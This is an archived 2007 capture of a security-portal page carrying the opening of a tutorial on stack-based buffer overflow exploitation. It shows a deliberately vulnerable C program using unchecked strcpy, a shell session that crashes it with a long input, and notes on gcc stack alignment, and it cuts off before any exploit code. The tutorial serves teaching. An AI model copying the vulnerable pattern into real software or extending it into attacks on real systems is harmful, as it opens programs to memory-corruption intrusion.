<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
 <head><script src="//archive.org/includes/athena.js" type="text/javascript"></script>
<script type="text/javascript">window.addEventListener('DOMContentLoaded',function(){var v=archive_analytics.values;v.service='wb';v.server_name='wwwb-app216.us.archive.org';v.server_ms=631;archive_analytics.send_pageview({});});</script>
<script type="text/javascript" src="https://web-static.archive.org/_static/js/bundle-playback.js?v=FC38Hc5A" charset="utf-8"></script>
<script type="text/javascript" src="https://web-static.archive.org/_static/js/wombat.js?v=txqj7nKC" charset="utf-8"></script>
<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden","showSwfDownload":true};</script>
<script type="text/javascript" src="https://web-static.archive.org/_static/js/ruffle/ruffle.js"></script>
<script type="text/javascript">
    __wm.init("https://web.archive.org/web");
  __wm.wombat("http://www.neworder.box.sk:80/newsread.php?newsid=12476","20070818115455","https://web.archive.org/","web","https://web-static.archive.org/_static/",
	      "1187438095");
</script>
<link rel="stylesheet" type="text/css" href="https://web-static.archive.org/_static/css/banner-styles.css?v=p7PEIJWi" />
<link rel="stylesheet" type="text/css" href="https://web-static.archive.org/_static/css/iconochive.css?v=3PDvdIFv" />
<!-- End Wayback Rewrite JS Include -->
 
	<title>NewOrder - news: Stack-based Overflow Exploit: Introduction to Classical and Advanced Overflow Technique</title>
	 
	<meta content="text/html; charset=utf-8" http-equiv="content-type">
	<meta name="description" content="Computer security and networking portal">
	<meta name="keywords" content="security,exploits,forums,artcles,sms news,links, ">

	<link rel="Shortcut Icon" href="/web/20070818115455im_/http://www.neworder.box.sk/imgsystem/favicon.ico" type="image/x-icon">
	<link rel="SHORTCUT ICON" href="/web/20070818115455im_/http://www.neworder.box.sk/imgsystem/favicon.ico" type="image/x-icon">
	<link rel="shortcut icon" href="/web/20070818115455im_/http://www.neworder.box.sk/imgsystem/favicon.ico" type="image/x-icon">

	<link rel="Icon" href="/web/20070818115455im_/http://www.neworder.box.sk/imgsystem/favicon.ico" type="image/x-icon">
	<link rel="stylesheet" href="/web/20070818115455cs_/http://www.neworder.box.sk/tools/style.css" type="text/css">
	<link rel="stylesheet" href="/web/20070818115455cs_/http://www.neworder.box.sk/tools/layout.css" type="text/css">
	<link rel="stylesheet" href="/web/20070818115455cs_/http://www.neworder.box.sk/tools/menu.css" type="text/css">
	<!--[if IE]>
                <style type="text/css" media="screen">
                        #menu{ float:right; }
                        body{
                                behavior:url(/tools/csshover.htc);
                                font-size:100%;
                        }
                        #menu ul li{
                                float: right;
                                width: 100%;
                        }
                        #menu h2, #menu a{
                                height:1%;
                                /*font:bold 0.7em/1.4em arial,helvetica,sans-serif;*/
                        }
                </style>
<![endif]-->

	<script language="JavaScript" type="text/javascript" src="/web/20070818115455js_/http://www.neworder.box.sk/tools/functions.js"></script>
	<script language="JavaScript" type="text/javascript" src="/web/20070818115455js_/http://www.neworder.box.sk/tools/scroller.js"></script>
</head> 
<body bgcolor="black" leftmargin="0" topmargin="0" marginheight="0" marginwidth="0" background="/web/20070818115455im_/http://www.neworder.box.sk/newsread.php?newsid=12476" link="#88cc99" alink="#88cc99" vlink="#66bb77" text="#eeeeee"><!-- BEGIN WAYBACK TOOLBAR INSERT -->
<script>__wm.rw(0);</script>
<div id="wm-ipp-base" lang="en" style="display:none;direction:ltr;" toolbar-mode="auto">
<div id="wm-ipp" style="position:fixed;left:0;top:0;right:0;">
<div id="donato" style="position:relative;width:100%;height:0;">
  <div id="donato-base">
    <iframe id="donato-if" src="https://archive.org/includes/donate.php?as_page=1&amp;platform=wb&amp;referer=https%3A//web.archive.org/web/20070818115455/http%3A//www.neworder.box.sk/newsread.php%3Fnewsid%3D12476"
	    scrolling="no" frameborder="0" style="width:100%; height:100%">
    </iframe>
  </div>
</div><div id="wm-ipp-inside">
  <div id="wm-toolbar" style="position:relative;display:flex;flex-flow:row nowrap;justify-content:space-between;">
    <div id="wm-logo" style="/*width:110px;*/padding-top:12px;">
      <a href="/web/" title="Wayback Machine home page"><img src="https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png" srcset="https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-100.png, https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-150.png 1.5x, https://web-static.archive.org/_static/images/toolbar/wayback-toolbar-logo-200.png 2x" alt="Wayback Machine" style="width:100px" border="0" /></a>
    </div>
    <div class="c" style="display:flex;flex-flow:column nowrap;justify-content:space-between;flex:1;">
      <form class="u" style="display:flex;flex-direction:row;flex-wrap:nowrap;" target="_top" method="get" action="/web/submit" name="wmtb" id="wmtb"><input type="text" name="url" id="wmtbURL" value="http://www.neworder.box.sk/newsread.php?newsid=12476" onfocus="this.focus();this.select();" style="flex:1;"/><input type="hidden" name="type" value="replay" /><input type="hidden" name="date" value="20070818115455" /><input type="submit" value="Go" />
      </form>
      <div style="display:flex;flex-flow:row nowrap;align-items:flex-end;">
                <div class="s" id="wm-nav-captures" style="flex:1;">
                    <a class="t" href="/web/20070818115455*/http://www.neworder.box.sk/newsread.php?newsid=12476" title="See a list of every capture for this URL">16 captures</a>
          <div class="r" title="Timespan for captures of this URL">21 Dec 2004 - 26 Jul 2011</div>
          </div>
        <div class="k">
          <a href="" id="wm-graph-anchor">
            <div id="wm-ipp-sparkline" title="Explore captures for this URL" style="position: relative">
              <canvas id="wm-sparkline-canvas" width="750" height="27" border="0"></canvas>
            </div>
          </a>
        </div>
      </div>
    </div>
    <div class="n">
      <table>
        <tbody>
          <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
          <tr class="m">
            <td class="b" nowrap="nowrap"><a href="https://web.archive.org/web/20070213010055/http://neworder.box.sk:80/newsread.php?newsid=12476" title="13 Feb 2007"><strong>Feb</strong></a></td>
            <td class="c" id="displayMonthEl" title="You are here: 11:54:55 Aug 18, 2007">AUG</td>
            <td class="f" nowrap="nowrap"><a href="https://web.archive.org/web/20080413085723/http://www.neworder.box.sk:80/newsread.php?newsid=12476" title="13 Apr 2008"><strong>Apr</strong></a></td>
          </tr>
          <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
          <tr class="d">
            <td class="b" nowrap="nowrap"><a href="https://web.archive.org/web/20070213010055/http://neworder.box.sk:80/newsread.php?newsid=12476" title="01:00:55 Feb 13, 2007"><img src="https://web-static.archive.org/_static/images/toolbar/wm_tb_prv_on.png" alt="Previous capture" width="14" height="16" border="0" /></a></td>
            <td class="c" id="displayDayEl" style="width:34px;font-size:22px;white-space:nowrap;" title="You are here: 11:54:55 Aug 18, 2007">18</td>
            <td class="f" nowrap="nowrap"><a href="https://web.archive.org/web/20080413085723/http://www.neworder.box.sk:80/newsread.php?newsid=12476" title="08:57:23 Apr 13, 2008"><img src="https://web-static.archive.org/_static/images/toolbar/wm_tb_nxt_on.png" alt="Next capture" width="14" height="16" border="0" /></a></td>
          </tr>
          <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
          <tr class="y">
            <td class="b" nowrap="nowrap"><a href="https://web.archive.org/web/20060215225038/http://neworder.box.sk:80/newsread.php?newsid=12476" title="15 Feb 2006"><strong>2006</strong></a></td>
            <td class="c" id="displayYearEl" title="You are here: 11:54:55 Aug 18, 2007">2007</td>
            <td class="f" nowrap="nowrap"><a href="https://web.archive.org/web/20081225021159/http://www.neworder.box.sk:80/newsread.php?newsid=12476" title="25 Dec 2008"><strong>2008</strong></a></td>
          </tr>
        </tbody>
      </table>
    </div>
    <div class="r" style="display:flex;flex-flow:column nowrap;align-items:flex-end;justify-content:space-between;">
      <div id="wm-btns" style="text-align:right;height:23px;">
                <span class="xxs">
          <div id="wm-save-snapshot-success">success</div>
          <div id="wm-save-snapshot-fail">fail</div>
          <a id="wm-save-snapshot-open" href="#" title="Share via My Web Archive" >
            <span class="iconochive-web"></span>
          </a>
          <a href="https://archive.org/account/login.php" title="Sign In" id="wm-sign-in">
            <span class="iconochive-person"></span>
          </a>
          <span id="wm-save-snapshot-in-progress" class="iconochive-web"></span>
        </span>
                <a class="xxs" href="https://help.archive.org/help/category/the-wayback-machine/" title="Get some help using the Wayback Machine" style="top:-6px;"><span class="iconochive-question" style="color:rgb(87,186,244);font-size:160%;"></span></a>
        <a id="wm-tb-close" href="#close" style="top:-2px;" title="Close the toolbar"><span class="iconochive-remove-circle" style="color:#888888;font-size:240%;"></span></a>
      </div>
      <div id="wm-share" class="xxs">
        <a href="/web/20070818115455/http://web.archive.org/screenshot/http://www.neworder.box.sk/newsread.php?newsid=12476"
           id="wm-screenshot"
           title="screenshot">
          <span class="wm-icon-screen-shot"></span>
        </a>
        <a href="#" id="wm-video" title="video">
          <span class="iconochive-movies"></span>
        </a>
        <a id="wm-share-facebook" href="#" data-url="https://web.archive.org/web/20070818115455/http://www.neworder.box.sk:80/newsread.php?newsid=12476" title="Share on Facebook" style="margin-right:5px;" target="_blank"><span class="iconochive-facebook" style="color:#3b5998;font-size:160%;"></span></a>
        <a id="wm-share-twitter" href="#" data-url="https://web.archive.org/web/20070818115455/http://www.neworder.box.sk:80/newsread.php?newsid=12476" title="Share on Twitter" style="margin-right:5px;" target="_blank"><span class="iconochive-twitter" style="color:#1dcaff;font-size:160%;"></span></a>
      </div>
      <div style="padding-right:2px;text-align:right;white-space:nowrap;">
        <a id="wm-expand" class="wm-btn wm-closed" href="#expand"><span id="wm-expand-icon" class="iconochive-down-solid"></span> <span class="xxs" style="font-size:80%;">About this capture</span></a>
      </div>
    </div>
  </div>
    <div id="wm-capinfo" style="border-top:1px solid #777;display:none; overflow: hidden">
        <div id="wm-capinfo-notice" source="api"></div>
                <div id="wm-capinfo-collected-by">
    <div style="background-color:#666;color:#fff;font-weight:bold;text-align:center;padding:2px 0;">COLLECTED BY</div>
    <div style="padding:3px;position:relative" id="wm-collected-by-content">
            <div style="display:inline-block;vertical-align:top;width:50%;">
			<span class="c-logo" style="background-image:url(https://archive.org/services/img/alexacrawls);"></span>
		Organization: <a style="color:#33f;" href="https://archive.org/details/alexacrawls" target="_new"><span class="wm-title">Alexa Crawls</span></a>
		<div style="max-height:75px;overflow:hidden;position:relative;">
	  <div style="position:absolute;top:0;left:0;width:100%;height:75px;background:linear-gradient(to bottom,rgba(255,255,255,0) 0%,rgba(255,255,255,0) 90%,rgba(255,255,255,255) 100%);"></div>
	  Starting in 1996, <a href="http://www.alexa.com/">Alexa Internet</a> has been donating their crawl data to the Internet Archive.  Flowing in every day, these data are added to the <a href="http://web.archive.org/">Wayback Machine</a> after an embargo period.
	</div>
	      </div>
      <div style="display:inline-block;vertical-align:top;width:49%;">
			<span class="c-logo" style="background-image:url(https://archive.org/services/img/44_crawl)"></span>
		<div>Collection: <a style="color:#33f;" href="https://archive.org/details/44_crawl" target="_new"><span class="wm-title">44_crawl</span></a></div>
		<div style="max-height:75px;overflow:hidden;position:relative;">
	  <div style="position:absolute;top:0;left:0;width:100%;height:75px;background:linear-gradient(to bottom,rgba(255,255,255,0) 0%,rgba(255,255,255,0) 90%,rgba(255,255,255,255) 100%);"></div>
	  this data is currently not publicly accessible.
	</div>
	      </div>
    </div>
    </div>
    <div id="wm-capinfo-timestamps">
    <div style="background-color:#666;color:#fff;font-weight:bold;text-align:center;padding:2px 0;" title="Timestamps for the elements of this page">TIMESTAMPS</div>
    <div>
      <div id="wm-capresources" style="margin:0 5px 5px 5px;max-height:250px;overflow-y:scroll !important"></div>
      <div id="wm-capresources-loading" style="text-align:left;margin:0 20px 5px 5px;display:none"><img src="https://web-static.archive.org/_static/images/loading.gif" alt="loading" /></div>
    </div>
    </div>
  </div></div></div></div><div id="wm-ipp-print">The Wayback Machine - https://web.archive.org/web/20070818115455/http://www.neworder.box.sk:80/newsread.php?newsid=12476</div>
<script type="text/javascript">//<![CDATA[
__wm.bt(750,27,25,2,"web","http://www.neworder.box.sk/newsread.php?newsid=12476","20070818115455",1996,"https://web-static.archive.org/_static/",["https://web-static.archive.org/_static/css/banner-styles.css?v=p7PEIJWi","https://web-static.archive.org/_static/css/iconochive.css?v=3PDvdIFv"], false);
  __wm.rw(1);
//]]></script>
<!-- END WAYBACK TOOLBAR INSERT -->
 
<a name="top"></a>
<script language="JavaScript" type="text/javascript">
var barbgcolor='black';
var fosize='12';
var bagcolor='black';
var focolor='white';
var mebagcolor='black';
var mefocolor='white';
</script> 
<div id="header">
<table border="0" width="100%" cellpadding="0" cellspacing="0">
        <tr>
                <td colspan="3" rowspan="1">
                        <script language="JavaScript" src="/web/20070818115455js_/http://www.neworder.box.sk/tools/linkbar.js" type="text/javascript"></script>
                </td>
        </tr>
        <tr>
                <td rowspan="2" colspan="1" width="10">&nbsp;</td>
                <td rowspan="1" colspan="1" width="193">
                        <a href="/web/20070818115455/http://www.neworder.box.sk/"><img src="/web/20070818115455im_/http://www.neworder.box.sk/logos/neworder.jpg" border="0" alt="Triangle Logo"></a>
                </td>
                <td rowspan="1" colspan="1" align="right">
                        <a style="color:white" target="_blank" href="https://web.archive.org/web/20070818115455/http://www.gfi.com/adentry.asp?adv=143&amp;loc=12">
		<img border="0" alt="Banner" src="/web/20070818115455im_/http://www.neworder.box.sk/ads/gfi/LANNSS.gif"><br>
		<font face="arial" style="color:white" size="-2">Windows security scanner (NMAP) - Download a free trial!</a></font>                </td>
        </tr>
	<tr>
		<td rowspan="1" colspan="1" width="193">
			<p><p>
<form name="myform" method="post">	

<script language="JavaScript">
function OnSSL()
{
  document.myform.action ="https://web.archive.org/web/20070818115455/https://neworder.box.sk/index.php";
  document.myform.sumbit();
}
function OnNormal()
{
 document.myform.action ="https://web.archive.org/web/20070818115455/http://neworder.box.sk/index.php";	
 document.myform.submit();
}
</script>

<table border="0" cellpadding="3" cellspacing="0">
<tr>
<td bgcolor="#114422" class="edgenormal">login:</td><td bgcolor="#114422" class="edgenormal"> 
<input type="text" maxlength="32" size="8" name="ulogin" class="submitinput" value=""></td>
</tr>
<tr>
<td class="edgenormal" bgcolor="#114422">password:</td><td class="edgenormal" bgcolor="#114422"> 
	<input type="password" maxlength="32" size="8" class="submitinput" name="upassword"></td>
</tr>
<tr>
<td colspan="2" bgcolor="#114422" align="right">
<input type="submit" class="submitinput" value="Login" onclick="javascript:OnNormal()">
<input type="submit" class="submitinput" value="SSL" onclick="javascript:OnSSL()">
</td>
</tr>
</table>


</form>
                </td>
		<td>&nbsp;</td>
	</tr>
</table>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
	<tr>
		<td align="right">
<div id="menu">
	<ul>
		<li>
			<h2><a href="/web/20070818115455/http://www.neworder.box.sk/">Main</a></h2>
			<ul>
				<li><a href="/web/20070818115455/http://www.neworder.box.sk/">Articles</a></li>
				<li><a href="/web/20070818115455/http://www.neworder.box.sk/exploits">Exploits</a></li>
				<li><a href="/web/20070818115455/http://www.neworder.box.sk/links">Links</a></li>
				<li><a href="/web/20070818115455/http://www.neworder.box.sk/projects">Projects</a></li>
			</ul>
		</li>
	</ul>
	<ul>
		<li>
			<h2><a href="/web/20070818115455/http://www.neworder.box.sk/forums">Forums</a></h2>
			<ul>
				<li><a href="/web/20070818115455/http://www.neworder.box.sk/forums">Overview</a></li>
                                <li><a href="/web/20070818115455/http://www.neworder.box.sk/rfp">Hot Topics</a></li>
			</ul>
		</li>
	</ul>
	<ul>
		<li>
			<h2><a href="/web/20070818115455/http://www.neworder.box.sk/vault">The Vault</a></h2>
		</li>
	</ul>
	<ul>
                <li>
                        <h2><a href="/web/20070818115455/http://www.neworder.box.sk/">Misc</a></h2>
			<ul>
				<li><a href="/web/20070818115455/http://www.neworder.box.sk/wallpapers.php">Wallpapers</a></li>
				<li><a href="/web/20070818115455/http://www.neworder.box.sk/gal_arch.php">Gallery</a></li>
				<li><a href="/web/20070818115455/http://www.neworder.box.sk/faq">FaQ</a></li>
				<li><a href="/web/20070818115455/http://www.neworder.box.sk/staff">Staff</a></li>
				<li><a href="/web/20070818115455/http://www.neworder.box.sk/nl">Newsletter</a></li>
			</ul>
                </li>
        </ul>
	<ul>
                <li>
                        <h2><a href="/web/20070818115455/http://www.neworder.box.sk/register">Register</a></h2>
                </li>
        </ul>
</div>
	</tr>
        <tr>
	        <td class="edgedotitle2" align="right">
        	<br>           	</td>
        </tr>
</table>

</div>
<div id="body">
<table width="100%" border="0" cellpadding="3" cellspacing="3">
	<tr><td valign="top" align="left" width="200">
	<div id="edgedotitle">features</div><p class="edgebig"><b><a href="/web/20070818115455/http://www.neworder.box.sk/post">post news</a></b></p><br/>
		<span class="edgesmall">(SMS/Articles)</span><p><font size="-2" face="verdana,arial,helvetica">
<form method="GET" action="/web/20070818115455/http://www.neworder.box.sk/search.php">
search files, exploits &amp; links sections:<br>
<input type="text" size="10" name="srch" class="selectinput"><input type="submit" value="search" class="submitinput"></form>
<p> 

 
</font>

 <form action="/web/20070818115455/http://www.neworder.box.sk/subject.php" method="get"><select name="subject" class="selectinput" onchange="location=&quot;/subject.php?subject=&quot;+this.options[this.selectedIndex].value;"><option value="SELECTED">Article Themes</option><option value="Articles">Articles</option><option value="Articles -> Encryption">Articles -&gt; Encryption</option><option value="Articles -> Hardware">Articles -&gt; Hardware</option><option value="Articles -> History">Articles -&gt; History</option><option value="Articles -> Networking">Articles -&gt; Networking</option><option value="Articles -> Programming">Articles -&gt; Programming</option><option value="Articles -> Security">Articles -&gt; Security</option><option value="Articles -> Software">Articles -&gt; Software</option><option value="Boxster's Lifestyle">Boxster's Lifestyle</option><option value="HOW-TO -> *nix">HOW-TO -&gt; *nix</option><option value="HOW-TO -> Hardware">HOW-TO -&gt; Hardware</option><option value="HOW-TO -> Networking">HOW-TO -&gt; Networking</option><option value="HOW-TO -> Programming">HOW-TO -&gt; Programming</option><option value="HOW-TO -> Windows">HOW-TO -&gt; Windows</option><option value="Interviews">Interviews</option><option value="New Order Newsletter">New Order Newsletter</option><option value="Out of the box">Out of the box</option><option value="Reviews -> Books">Reviews -&gt; Books</option><option value="Reviews -> Hardware">Reviews -&gt; Hardware</option><option value="Reviews -> Software">Reviews -&gt; Software</option><option value="SMS">SMS</option><option value="Site News">Site News</option><option value="Theme of the month">Theme of the month</option><option value="Views">Views</option></select></form><p> 
</p><div id="edgedotitle">logged users</div><p class="edgesmall">
active for last 5 minutes<br><p class="edgesmall">registered users: 10103 <br><br><span class="edgesmall">There are currently 0 registered users and 79 guests browsing the website.</span><p>

<div id="edgedotitle">online chat</div>&nbsp;<b>server:</b><br>
                        &nbsp;&nbsp;&nbsp;irc.xor.cx<br>
                        &nbsp;<b>channel:</b><br>
                        &nbsp;&nbsp;&nbsp;#neworder<p><div id="edgedotitle">Latest SMS headlines</div>
<script language="javascript" type="text/javascript">
var scrollercontent=new Array();scrollercontent[0]='<a href="/smsread.php?newsid=16692">Wikipedia \'shows CIA page edits\' </a>';scrollercontent[1]='<a href="/smsread.php?newsid=16691">Zero-day vulnerability in Yahoo Messenger </a>';scrollercontent[2]='<a href="/smsread.php?newsid=16690">Automated Solutions from IBM/Lenovo creates vulnerability </a>';scrollercontent[3]='<a href="/smsread.php?newsid=16689">Ubuntu community servers penetrated </a>';scrollercontent[4]='<a href="/smsread.php?newsid=16688">Microsoft patches Kernel Patch Protection for 64-bit Windows </a>';scrollercontent[5]='<a href="/smsread.php?newsid=16687">Universities warned of Storm Worm attacks</a>';scrollercontent[6]='<a href="/smsread.php?newsid=16686">Crafted fonts undermine Java security </a>';scrollercontent[7]='<a href="/smsread.php?newsid=16685">Opera fixes JavaScript vulnerability </a>';scrollercontent[8]='<a href="/smsread.php?newsid=16684">Allofmp3.com Acquitted Of Copyright Infringement By Russian Court </a>';scrollercontent[9]='<a href="/smsread.php?newsid=16680">British rail passengers to get free Wi-Fi ride.</a>';scrollercontent[10]='<a href="/smsread.php?newsid=16679">Record-breaking \'Storm\' linked to spam surge.</a>';scrollercontent[11]='<a href="/smsread.php?newsid=16676">OpenGL 3 Announced.</a>';scrollercontent[12]='<a href="/smsread.php?newsid=16675">Thieves in U.K. steal police-data server.</a>';scrollercontent[13]='<a href="/smsread.php?newsid=16674">UN\'s website breached by hackers</a>';scrollercontent[14]='<a href="/smsread.php?newsid=16673">Linus explains why open source works.</a>';scrollercontent[15]='<a href="/smsread.php?newsid=16669">NSA can tap a third of the world\'s telecoms</a>';scrollercontent[16]='<a href="/smsread.php?newsid=16671">Croatians succeed in hacking the iPhone </a>';scrollercontent[17]='<a href="/smsread.php?newsid=16670">The TJX Effect </a>';scrollercontent[18]='<a href="/smsread.php?newsid=16668">PKI enhancements in Windows.</a>';scrollercontent[19]='<a href="/smsread.php?newsid=16667">Exploit released for vulnerability in BIND9 nameserver </a>';
new pausescroller(scrollercontent, "scroller", "", 4000)
</script>
<div id="edgedotitle">random article</div><table border="0" width="100%"><tr><td colspan="2" class="edgesmall"><a href="/web/20070818115455/http://www.neworder.box.sk/news/5219">Advanced Encipherment Techniques</a></td></tr><tr><td align="left" class="edgesmall">stand__sure</td><td align="right" class="edgesmall">Jul 7 2002</td></tr></table><br><div id="edgedotitle">quotable quotes</div><span class="edgesmall">There are two possible approaches to fixing this. One, as nabiy suggests, is to change how PHP is presented to web developers. Label it as a chain saw, and point out that chain saws don't know the difference between "log" and "leg" <div align="right"><i>Crispin Cowan</i></div></span><br><p><div id="edgedotitle">NO image gallery</div><table cellpadding="2" cellspacing="2" border="0" width="100%"><tr><td bgcolor="#002211"><span class="edgesmall">Aug 16, 2007</span><br><a href="javascript:otvor(&quot;/gal_open.php?id=4423&quot;,614,550)"><img border="0" src="/web/20070818115455im_/http://www.neworder.box.sk/uploads/00004423.jpg"></a><p class="edgesmall"><b>1034_image.jpg</b> / <a href="/web/20070818115455/http://www.neworder.box.sk/gal_arch.php?cat="></a><br/>click on the picture 
to enlarge and see description<p><p class="edgemenu"><a href="/web/20070818115455/http://www.neworder.box.sk/forum.php?did=gale4423">read</a> (0)&nbsp;/&nbsp;<a href="/web/20070818115455/http://www.neworder.box.sk/forum.newtopic.php?did=gale4423">write</a>&nbsp;comment<p class="edgemenu"><select name="gal_arch" class="selectinput" onchange="location=&quot;/gal_arch.php?cat=&quot;+this.options[this.selectedIndex].value"><option vlaue="">view archive&nbsp;(500)</option><option value="">General&nbsp;(18)</option><option value="mods">mods&nbsp;(40)</option><option value="computers%20and%20networks">computers and networks&nbsp;(105)</option><option value="other%20stuff">other stuff&nbsp;(130)</option><option value="user%20setups">user setups&nbsp;(171)</option><option value="merry%20pranksters">merry pranksters&nbsp;(36)</option></select><p class="edgemenu"><a href="/web/20070818115455/http://www.neworder.box.sk/gal_upload.php">submit a picture to the gallery</a></td></tr></table>    </td>
 <td align="left" valign="top">
 <font face="arial,helvetica" size="-1">   

<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr><td bgcolor="">
	<table width="100%" border="0" cellpadding="4" cellspacing="0"><tr>
	<td bgcolor="#114422" class="edgenormal"><span class="edgeatitle">Stack-based Overflow Exploit: Introduction to Classical and Advanced Overflow Technique</span><br>
	<span class="edgeasubj"><a href="/web/20070818115455/http://www.neworder.box.sk/subject.php?subject=Articles">@ Articles</a></span>&nbsp;&nbsp;&nbsp;&nbsp;
	<span class="edgeadate">Dec 08 2004, 07:59 (UTC+0) </span></td></tr><tr><td bgcolor="#002211"><span class="edgeatext"><a href="/web/20070818115455/http://www.neworder.box.sk/user/wowhacker">wowhacker</a> writes: </span><span class="edgeatext"><code>
&nbsp;&nbsp;&nbsp;&nbsp;<br/>&nbsp;&nbsp;&nbsp;&nbsp;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Stack-based&nbsp;Overflow&nbsp;Exploit<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;Introduction&nbsp;to&nbsp;Classical&nbsp;and&nbsp;Advanced&nbsp;Overflow&nbsp;Technique&nbsp;-<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;By&nbsp;vangelis(vangelis@wowhacker.org)<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Email:&nbsp;progressfree&nbsp;at&nbsp;hotmail.com<br/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Thanks&nbsp;to&nbsp;beist(http://beist.org),&nbsp;naska!<br/>&nbsp;&nbsp;&nbsp;&nbsp;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++<br/><br/>1.&nbsp;Introduction<br/><br/>&nbsp;&nbsp;&nbsp;In&nbsp;this&nbsp;document&nbsp;I&nbsp;will&nbsp;not&nbsp;talk&nbsp;about&nbsp;what&nbsp;overflow&nbsp;is&nbsp;and&nbsp;how&nbsp;much<br/>serious&nbsp;it&nbsp;is.&nbsp;There&nbsp;are&nbsp;so&nbsp;many&nbsp;articles&nbsp;about&nbsp;them.&nbsp;Before&nbsp;going&nbsp;into<br/>the&nbsp;&nbsp;main&nbsp;discussion,&nbsp;&nbsp;I&nbsp;make&nbsp;&nbsp;such&nbsp;a&nbsp;&nbsp;simple&nbsp;&nbsp;program&nbsp;as&nbsp;vul.c.&nbsp;Almost<br/>everyone&nbsp;&nbsp;with&nbsp;a&nbsp;small&nbsp;knowledge&nbsp;&nbsp;of&nbsp;buffer&nbsp;overflow&nbsp;can&nbsp;&nbsp;find&nbsp;out&nbsp;what&nbsp;<br/>the&nbsp;&nbsp;problem&nbsp;is.&nbsp;As&nbsp;&nbsp;you&nbsp;know,&nbsp;strcpy()&nbsp;function&nbsp;&nbsp;doesn't&nbsp;mind&nbsp;how&nbsp;many&nbsp;<br/>data&nbsp;we&nbsp;put&nbsp;into&nbsp;buffer.

</code><br/>  <br/>  <code>
[root@localhost&nbsp;bof]#&nbsp;cat&nbsp;&gt;&nbsp;vul.c<br/>int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;*argv[])<br/>{<br/>&nbsp;&nbsp;char&nbsp;buffer[100];<br/>&nbsp;&nbsp;strcpy(buffer,argv[1]);<br/>}<br/>[root@localhost&nbsp;bof]#&nbsp;gcc&nbsp;-o&nbsp;vul&nbsp;vul.c<br/>[root@localhost&nbsp;bof]#./vul&nbsp;`perl&nbsp;-e&nbsp;'print&nbsp;"A"x124'`<br/>Segmentation&nbsp;fault<br/>[root@localhost&nbsp;bof]#<br/><br/><br/>When&nbsp;we&nbsp;put&nbsp;124&nbsp;"A"&nbsp;into&nbsp;buffer,&nbsp;the&nbsp;vulnerable&nbsp;program&nbsp;got&nbsp;'Segmentation<br/>fault.'&nbsp;Someone&nbsp;may&nbsp;wonder&nbsp;why&nbsp;the&nbsp;vulnerable&nbsp;program&nbsp;got&nbsp;'Segmentation<br/>fault'&nbsp;when&nbsp;we&nbsp;put&nbsp;data&nbsp;more&nbsp;than&nbsp;124&nbsp;bytes.&nbsp;As&nbsp;you&nbsp;know,&nbsp;memory&nbsp;can&nbsp;only<br/>be&nbsp;addressed&nbsp;in&nbsp;the&nbsp;word&nbsp;size(4&nbsp;bytes).&nbsp;So&nbsp;we&nbsp;may&nbsp;think&nbsp;that&nbsp;the&nbsp;vulnerable<br/>program&nbsp;gets&nbsp;'Segmentation&nbsp;fault'&nbsp;when&nbsp;we&nbsp;put&nbsp;104&nbsp;bytes(26&nbsp;words)&nbsp;data.&nbsp;The<br/>key&nbsp;point&nbsp;is&nbsp;that&nbsp;there&nbsp;were&nbsp;some&nbsp;changes&nbsp;after&nbsp;gcc&nbsp;2.96&nbsp;version.&nbsp;If&nbsp;my<br/>system&nbsp;uses&nbsp;gcc&nbsp;2.95&nbsp;version&nbsp;and&nbsp;below&nbsp;it,&nbsp;the&nbsp;vulnerable&nbsp;program&nbsp;will&nbsp;get<br/>'Segmentation&nbsp;fault'&nbsp;when&nbsp;we&nbsp;put&nbsp;104&nbsp;bytes&nbsp;data.&nbsp;I&nbsp;will&nbsp;explain&nbsp;about&nbsp;the<br/>main&nbsp;change.<br/><br/>The&nbsp;main&nbsp;change&nbsp;is&nbsp;that&nbsp;stack&nbsp;is&nbsp;aligned&nbsp;by&nbsp;16&nbsp;bytes&nbsp;after&nbsp;gcc&nbsp;2.96.&nbsp;So<br/>when&nbsp;main()&nbsp;function&nbsp;is&nbsp;called,&nbsp;the&nbsp;space&nbsp;for&nbsp;a&nbsp;local&nbsp;variable&nbsp;is&nbsp;filled&nbsp;by<br/>16&nbsp;bytes.&nbsp;Look&nbsp;at&nbsp;the&nbsp;following&nbsp;program.<br/><br/><br/>----------------------------------------------------<br/>int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;*argv[])<br/>{<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;char&nbsp;buffer[n];<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;strcpy(buffer,&nbsp;argv[1]);<br/>}<br/>---------------------------------------